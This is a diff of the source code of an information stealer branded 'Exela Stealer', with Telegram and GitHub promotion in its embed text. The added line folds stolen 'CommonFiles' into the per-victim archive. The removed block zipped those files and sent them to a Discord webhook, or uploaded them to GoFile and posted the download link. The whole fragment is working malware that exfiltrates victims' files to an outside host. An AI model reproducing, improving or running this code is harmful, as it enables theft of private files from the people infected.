@@ -1869,6 +1869,7 @@ class Main:
         output_lines = stdout.decode(errors="ignore").split("\n")
         uuid = output_lines[1].strip() if len(output_lines) > 1 else "NONE"
         filePath:str = os.path.join(self.Temp, uuid)
+        await self.StealCommonFiles(os.path.join(uuid, "CommonFiles"))
         shutil.make_archive(filePath, "zip", filePath)
         embed_data = {
             "title": "***Exela Stealer***",
@@ -1939,36 +1940,7 @@ class Main:
                 shutil.rmtree(filePath)
             except:
                 pass
-            await self.StealCommonFiles("CommonFiles")
-            try:
-                shutil.make_archive(os.path.join(self.Temp, "CommonFiles"), "zip", os.path.join(self.Temp, "CommonFiles"))
-                if not os.path.getsize(os.path.join(self.Temp, "CommonFiles") + ".zip") / (1024 * 1024) > 10:
-                    with open(os.path.join(self.Temp, "CommonFiles") + ".zip", 'rb') as file:
-                        dosya_verisi = file.read()
-                    payload = aiohttp.FormData()
-                    payload.add_field('file', dosya_verisi, filename=os.path.basename(os.path.join(self.Temp, "CommonFiles") + ".zip"))
-                    async with session.post(webhook, data=payload) as f:
-                        pass
-                else:
-                    succes = await UploadGoFile.upload_file(os.path.join(self.Temp, "CommonFiles") + ".zip")
-                    if succes != None:
-                        embed_data2 = {
-                            "title": "***Exela Stealer***",
-                            "description": f"***Exela Stealer Full Info***",
-                            "url" : "https://t.me/ExelaStealer",
-                            "color": 0,
-                            "footer": {"text": "https://t.me/ExelaStealer | https://github.com/quicaxd"},
-                            "thumbnail": {"url": "https://media.discordapp.net/attachments/1133692440029700117/1140245373496074270/195198d656ec1e2b59a6a823bb250272.jpg?width=489&height=468"}}
-                        fields2 = [{"name": "Download Link", "value": f"[CommonFiles.zip]({succes})", "inline": True}]
-                        embed_data2["fields"] = fields2
-                        payload2 = {
-                            "username": "Exela Stealer",
-                            "embeds": [embed_data2] }
-                        async with session.post(webhook, json=payload2) as req:
-                            pass
-                    else:print("file cannot uploaded to GoFile.")
-            except Exception as e:
-                print(e)
+            
 
 
 class UploadGoFile:
